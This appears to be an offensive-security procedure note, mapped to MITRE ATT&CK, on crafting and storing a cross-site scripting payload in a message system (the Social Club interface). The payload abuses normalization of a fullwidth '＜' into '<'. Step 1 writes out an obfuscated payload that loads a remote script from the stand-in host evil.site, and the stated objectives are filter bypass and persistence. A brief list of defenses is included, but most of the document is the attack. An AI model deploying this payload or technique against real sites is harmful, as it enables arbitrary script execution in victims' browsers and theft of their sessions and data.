---
tags:
  - xss
  - payload-crafting
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b0c49437-49c2-469e-9604-6e099aeaaafb
created_at: '2025-12-11T06:06:04.859Z'
updated_at: '2025-12-11T06:06:04.859Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Craft and Inject XSS Payload

## Summary

This procedure details the creation and injection of a malicious XSS payload exploiting character normalization in a web message system to inject script tags.

## Description

Using the identified normalization of '＜' to '<', craft a payload that forms a valid script tag after normalization. The payload is injected into the message system, where it is stored and can be triggered upon viewing. This enables arbitrary JavaScript execution.

## Requirements

1. Confirmed vulnerability from discovery phase
2. Access to send messages in the target system
3. A hosted malicious script (e.g., at //evil.site/poc.js)

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to remove or escape special characters
- Validate and normalize inputs consistently
- Log and alert on suspicious payloads containing script-like patterns

## Objectives

1. Create an obfuscated payload that bypasses basic filters
2. Inject the payload successfully into the system
3. Ensure payload persistence for later execution

## Instructions

### Step 1: Design Payload

**Context**: Construct the payload using normalization to form '<script>'.

Create the payload string: =\[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕\

> This will normalize to a functional script tag.

### Step 2: Inject into Message System

**Context**: Send the payload as a message to store it.

Use the Social Club interface to send the payload as message content.

> Confirm the message is sent and stored without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xss]]
- [[injection]]
